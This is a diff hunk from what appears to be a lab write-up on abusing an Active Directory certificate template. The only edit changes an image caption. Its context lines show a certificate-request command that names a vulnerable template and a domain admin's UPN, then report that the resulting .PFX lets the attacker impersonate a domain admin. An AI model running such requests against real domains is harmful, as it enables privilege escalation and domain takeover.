@@ -73,7 +73,7 @@ i've created a template under the name of VulnTemplate which allows for both the
 
  > python3 entry.py req -u joshua@cxlabs.local -p REDACTED -target 192.168.197.129 -template VulnTemplate -ca "CXLABS-CXLABS-DC-01-CA" -upn "domain_admin@cxlabs.local"
 
-![POC](/poc.png)
+![poc](/poc.png)
 
 as you can see we have successfully managed to receive a .PFX certificate that allows us to impersonate a domain admin.
 
